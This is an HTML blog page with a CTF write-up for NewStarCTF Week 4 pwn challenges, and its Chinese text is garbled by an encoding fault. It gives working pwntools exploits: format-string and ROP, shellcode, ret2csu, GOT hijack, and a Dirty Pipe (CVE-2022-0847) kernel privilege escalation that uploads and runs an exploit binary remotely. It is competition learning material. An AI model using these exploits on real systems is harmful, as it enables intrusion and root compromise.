<!DOCTYPE html>
<html>
    <head>
    <meta charset="utf-8">
    <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover" name="viewport" />
    <link rel="alternate icon" type="image/png" href="/img/favicon.png">
    <title>é·ºé›¨ã®Blog | </title>
    
<link rel="stylesheet" href="/css/reset.css">

    
<link rel="stylesheet" href="/css/style.css">

    
<link rel="stylesheet" href="/css/markdown.css">

    
<link rel="stylesheet" href="/css/fonts.css">

<meta name="generator" content="Hexo 6.2.0"></head>
    <body>
        <div class="paper">
            <div class="paper-main">
                
                    <div class="post-header">
    <a class="logo" href="/">é·ºé›¨ã®Blog</a>
    <a class="go-home" href="/">
        <svg width="8" height="14" viewBox="0 0 8 14">
            <path d="M7 1L1 7l6 6" stroke="#000" stroke-width="2" fill="none" fill-rule="evenodd" stroke-linecap="round" stroke-linejoin="round"/>
        </svg>
    </a>
</div>
                
                <div class="post-main">

    
    
        <div class="post-main-title">
            NewStarCTF Week4 PWN WP
        </div>
        <div class="post-meta">
            2022-10-17
        </div>
        <div class="post-md">
            <h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><blockquote>
<p>ç”±äºçŸ¥é“è¿™ä¸ªæ¯”èµ›æ¯”è¾ƒæ™šï¼Œæ­£å¼å‚ä¸æ¯”èµ›æ˜¯ç¬¬å››å‘¨çš„å‘¨ä¸‰æ™šä¸Šï¼Œè¿˜å·®ä¸€é“å †ğŸï¼Œæ²¡æœ‰å®ŒæˆAK(ä½†æ˜¯æ‹¿äº†å››ä¸ªä¸€è¡€ä¹Ÿå¥½çˆ½)ã€‚æœ€åä¸€é¢˜æœªè§£ä¸»è¦åŸå› ç¡®å®æ˜¯è‡ªå·±åœ¨_IO_Fileç›¸å…³åˆ©ç”¨äº†è§£ä¸è¶³ï¼Œèµ›åæ‰¾å¤œæ‚ å¸ˆå‚…æ‹¿åˆ°äº†expï¼ŒçœŸçš„å¥½æ„Ÿè°¢ğŸŒ¹</p>
</blockquote>
<p><img src="/img/article/newstarctf/image-20221017112826465.png" alt="æˆ˜ç»©æˆªå›¾"></p>
<h2 id="Canary"><a href="#Canary" class="headerlink" title="Canary"></a>Canary</h2><p>æ¯”è¾ƒç®€å•çš„ä¸€é“é¢˜ï¼Œç­‰æˆ‘å¼€å§‹åšé¢˜çš„æ—¶å€™å·²ç»æœ‰4ä¸ªè§£äº†</p>
<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *

io = process(&#39;./pwn&#39;)
# io = remote(&#39;node4.buuoj.cn&#39;,26078)
context.log_level = &#39;debug&#39;
# pause()
io.recvuntil(&#39;Now answer me, will you v me 50&#39;)
io.sendline(&#39;%11$p%9$p&#39;)
io.recvline()
canary = int(io.recv(18),16)
code_base = int(io.recv(14),16) - 0x840 
success(&quot;canary --&gt;&quot;+hex(canary))
success(&quot;code_base--&gt;&quot;+hex(code_base))

money = code_base + 0x20206c
payload =  b&#39;%99c%7$n&#39; + p64(money)
pause()
io.recvuntil(&#39;What do you want to say to the canary&#39;)
io.sendline(payload)
io.recvline()
binsh = code_base + 0x202020
pop_rdi = code_base+0x0000000000000b33 #: pop rdi ; ret
syscall = code_base + 0x9dc
payload = b&#39;a&#39;*0x28 + p64(canary) + b&#39;a&#39;*0x8 + p64(pop_rdi) + p64(binsh) + p64(syscall)
io.sendline(payload)

io.interactive()
</code></pre>
<h2 id="OhMyShellcode"><a href="#OhMyShellcode" class="headerlink" title="OhMyShellcode"></a>OhMyShellcode</h2><p>ä¸€é“orwçš„shellcodeé¢˜ç›®ï¼Œé¢˜ç›®ä¸“é—¨å¼€äº†ä¸€ä¸ªç©ºé—´ç”¨äºæ”¾ç½®orwï¼Œä¹Ÿæ¯”è¾ƒç®€å•ã€‚å…³é”®åœ¨äºç¬¬ä¸€æ¬¡è¯»å…¥æœ‰ä¸ªåˆ¤æ–­ï¼Œä¼šæ‹¦ä½<code>\x0f</code>ï¼Œä½†æ˜¯æ£€æµ‹é•¿åº¦å¹¶ä¸å®Œå…¨ã€‚</p>
<h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *
# io = process(&#39;./pwn&#39;)
io = remote(&#39;node4.buuoj.cn&#39;,25430)
context.arch = &#39;amd64&#39;
# context.log_level = &#39;debug&#39;

backdoor = 0x233000

io.recvuntil(&#39;Show me your magic.&#39;)
read = &#39;&#39;&#39;mov rsi,0x23301e
mov rax , 0
mov rax , 0
mov rax , 0
syscall
&#39;&#39;&#39;
sh = asm(read)
sh2 =asm(shellcraft.open(&#39;./flag&#39;))
sh2+=asm(shellcraft.read(3,backdoor+0x100,0x100))
sh2+=asm(shellcraft.write(1,backdoor+0x100,0x100))

io.send(sh)
pause()
io.recvuntil(&#39;Good luck!&#39;)
payload = b&#39;a&#39;*0x38 + p64(backdoor)
io.sendline(payload)
raw_input()
io.sendline(sh2)
io.interactive()
</code></pre>
<h2 id="ret2csu2"><a href="#ret2csu2" class="headerlink" title="ret2csu2"></a>ret2csu2</h2><p>åšè¿™é“é¢˜çš„æ—¶å€™å¹¶æ²¡æœ‰å»çœ‹ç¬¬ä¸‰å‘¨çš„ret2csuï¼Œå¤œæ‚ å¸ˆå‚…çš„è¯„ä»·æ˜¯è¿™æ ·çš„ï¼Œä¸å¾—ä¸è¯´è¿™ä¸ªé¢˜çš„gadgetè¿˜æ˜¯å¾ˆæ¼‚äº®çš„ã€‚</p>
<p><img src="/img/article/newstarctf/image-20221017121338219.png" alt="ä¼šç©å°±è¡Œ"></p>
<p>ç¬¬ä¸€æ¬¡payloadè¦æ”¹rbpåˆ°bssæ®µï¼ŒåŒæ—¶è·³è½¬å›<code>sys_read</code>ï¼Œå®ç°å¯¹bsså†™å…¥<code>ret2csu</code>çš„ropè°ƒç”¨<code>mprotect</code>ï¼Œä»¥åŠshellcodeå¸ƒç½®ã€‚</p>
<h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *

# io = process(&#39;./pwn&#39;)
io = remote(&#39;node4.buuoj.cn&#39;,29895)
context.arch = &#39;amd64&#39;
context.log_level = &#39;debug&#39;
csu_end_addr = 0x40075a
csu_front_addr = 0x400740

mprotect = 0x40067b
mprotect_plt = 0x600fe8
bss = 0x601110
bss1 = 0x601020
leave_ret =0x400681
def csu(rbx, rbp, r12, r13, r14, r15, last):
    payload = p64(csu_end_addr) + p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)
    payload += p64(csu_front_addr)
    payload += b&#39;a&#39; * 0x38
    payload += p64(last)
    sc = asm(shellcraft.sh())
    payload +=sc
    payload += b&#39;b&#39; *0x40
    payload += p64(bss1-0x8)
    payload += p64(leave_ret)
    io.send(payload)
    # sleep(1)
pause()
io.recvuntil(&#39;check it!&#39;)
payload = b&#39;a&#39;*0xf0+p64(bss)+p64(0x4006e7)
io.send(payload)
sleep(1)

csu(0,1,mprotect_plt,0x601000,0x1000,0x7,0x6010a0)

io.interactive()ma
</code></pre>
<h2 id="è¿™æ˜¯å †ğŸ´"><a href="#è¿™æ˜¯å †ğŸ´" class="headerlink" title="è¿™æ˜¯å †ğŸ´"></a>è¿™æ˜¯å †ğŸ´</h2><p>è¿™é“é¢˜ç”±äºheapè§’æ ‡æ£€æµ‹å¯ä»¥ä¸ºè´Ÿï¼Œåˆ©ç”¨ä¸€ä¸ªæŒ‡å‘è‡ªå·±çš„æŒ‡é’ˆå®ç°ä»»æ„åœ°å€å†™ï¼ŒéšååŠ«æŒgotä¸ºone_gadgetå³å¯</p>
<h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *

# io = process(&#39;./pwn&#39;)
io = remote(&#39;node4.buuoj.cn&#39;,28432)
# context.log_level = &#39;debug&#39;

libc = ELF(&#39;./libc-2.31.so&#39;)
heap = 0x6020e0
puts = 0x602018 #-25

def show(idx):
    io.recvuntil(&quot;&gt;&gt;&quot;)
    io.sendline(&#39;4&#39;)
    io.recvuntil(&#39;Index:&#39;)
    io.sendline(str(idx))
    
def edit(idx,text):
    io.recvuntil(&quot;&gt;&gt;&quot;)
    io.sendline(&#39;3&#39;)
    io.recvuntil(&#39;Index:&#39;)
    io.sendline(str(idx))
    io.recvuntil(&#39;Content:&#39;)
    io.sendline(text)

edit(-12,p64(0x602038))    
show(-12)

# io.recvunti(&#39;Content:&#39;)
puts = u64(io.recv(6).ljust(8,b&#39;\x00&#39;))
libc_base = puts - libc.symbols[&#39;printf&#39;]
pause()
success(&quot;puts_addr--&gt;&quot;+hex(puts))
success(&quot;libc_base--&gt;&quot;+hex(libc_base))

one_gadget = libc_base + 0xe3b01
edit(-12,p64(one_gadget))
io.interactive()
</code></pre>
<h2 id="KMario"><a href="#KMario" class="headerlink" title="KMario"></a>KMario</h2><p>ä¸€é“kernelé¢˜ç›®ï¼Œåˆ©ç”¨CVE-2022-0847å®ç°æœ¬åœ°ææƒã€‚å…³é”®åœ¨äºè¿œç«¯æ²¡æœ‰gccï¼Œæ‰€ä»¥åªèƒ½æœ¬åœ°ç¼–è¯‘å¥½ã€‚å…ˆæŠŠelfè½¬ä¸ºbase64ï¼Œéšååœ¨è¿œç«¯è½¬å›elfæ–‡ä»¶å³å¯ã€‚</p>
<blockquote>
<p>POCé“¾æ¥ï¼š<a target="_blank" rel="noopener" href="https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits">CVE-2022-0847-DirtyPipe-Exploits</a></p>
<p>ä¸è¿‡æˆ‘è‡ªå·±åšçš„æ—¶å€™ä¼¼ä¹ç”±äºelfæ–‡ä»¶å¤ªå¤§ï¼Œä¸€ç›´ä¼ ä¸ä¸Šå»ï¼Œçœ‹äº†å¤œæ‚ å¸ˆå‚…çš„expæ‰å‘ç°å‹ç¼©ä¸€ä¸‹å°±å¥½ï¼Œæˆ‘çœŸæ˜¯ä¸ªé“¸å¸</p>
</blockquote>
<h3 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a>exp</h3><pre><code class="python"># -*- coding: utf-8 -*-
from pwn import *
import os

context.log_level = &#39;debug&#39;
cmd = &#39;$ &#39;


def exploit(r):
    r.sendlineafter(cmd, &#39;stty -echo&#39;)
    os.system(&#39;gzip -c ./exp2 &gt; ./exp.gz&#39;)
    r.sendlineafter(cmd, &#39;cd /tmp&#39;)
    r.sendlineafter(cmd, &#39;cat &lt;&lt;EOF &gt; exp.gz.b64&#39;)
    r.sendline((read(&#39;./exp.gz&#39;)).encode(&#39;base64&#39;))
    r.sendline(&#39;EOF&#39;)
    r.sendlineafter(cmd, &#39;base64 -d exp.gz.b64 &gt; exp.gz&#39;)
    r.sendlineafter(cmd, &#39;gunzip ./exp.gz&#39;)
    r.sendlineafter(cmd, &#39;chmod +x ./exp&#39;)
    r.sendlineafter(cmd, &#39;./exp /pwnmeplz&#39;)
    r.interactive()


p = remote(&#39;node4.buuoj.cn&#39;,25457)
# p = process(&#39;./start.sh&#39;)
exploit(p)
</code></pre>

        </div>

    

</div>
                <div class="footer">
    <span>Copyright Â© 2022 é·ºé›¨ã®Blog</span>
    <span>Theme Designed By <a target="_blank" href="https://zheli.design/one-paper">é€™æè¨­è¨ˆ</a></span>
</div>


<link rel="stylesheet" href="/css/a11y-dark.min.css">


<script src="/js/highlight.min.js"></script>


<script src="/js/highlightjs-line-numbers.js"></script>


<script>
    hljs.initHighlightingOnLoad();
    hljs.initLineNumbersOnLoad();
</script>

            </div>
        </div>
    <!-- hexo injector body_end start -->
  <script data-pjax src="https://cdn.jsdelivr.net/gh/Zfour/hexo-github-calendar@1.21/hexo_githubcalendar.js"></script>
  <script data-pjax>
        function GithubCalendarConfig(){
            var git_githubapiurl ="https://python-github-calendar-api.vercel.app/api?Loora1N";
            var git_color =['#ebedf0', '#fdcdec', '#fc9bd9', '#fa6ac5', '#f838b2', '#f5089f', '#c4067e', '#92055e', '#540336', '#48022f', '#30021f'];
            var git_user ="Loora1N";
            var parent_div_git = document.getElementById('recent-posts');
            var git_div_html = '<div class="recent-post-item" style="width:100%;height:auto;padding:10px;"><div id="github_loading" style="width:10%;height:100%;margin:0 auto;display: block"><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"  viewBox="0 0 50 50" style="enable-background:new 0 0 50 50" xml:space="preserve"><path fill="#d0d0d0" d="M25.251,6.461c-10.318,0-18.683,8.365-18.683,18.683h4.068c0-8.071,6.543-14.615,14.615-14.615V6.461z" transform="rotate(275.098 25 25)"><animateTransform attributeType="xml" attributeName="transform" type="rotate" from="0 25 25" to="360 25 25" dur="0.6s" repeatCount="indefinite"></animateTransform></path></svg></div><div id="github_container"></div></div>';
            if(parent_div_git && location.pathname =='/about/'){
                console.log('å·²æŒ‚è½½github calendar')
                // parent_div_git.innerHTML=git_div_html+parent_div_git.innerHTML // æ— æŠ¥é”™ï¼Œä½†ä¸å½±å“ä½¿ç”¨(æ”¯æŒpjaxè·³è½¬)
                parent_div_git.insertAdjacentHTML("afterbegin",git_div_html) // æœ‰æŠ¥é”™ï¼Œä½†ä¸å½±å“ä½¿ç”¨(æ”¯æŒpjaxè·³è½¬)
            };
            GithubCalendar(git_githubapiurl,git_color,git_user)
        }
        if(document.getElementById('recent-posts')){
            GithubCalendarConfig()
        }
    </script>
    <style>#github_container{min-height:280px}@media screen and (max-width:650px) {#github_container{background-image:;min-height:0px}}</style>
    <style></style><!-- hexo injector body_end end --></body>
</html>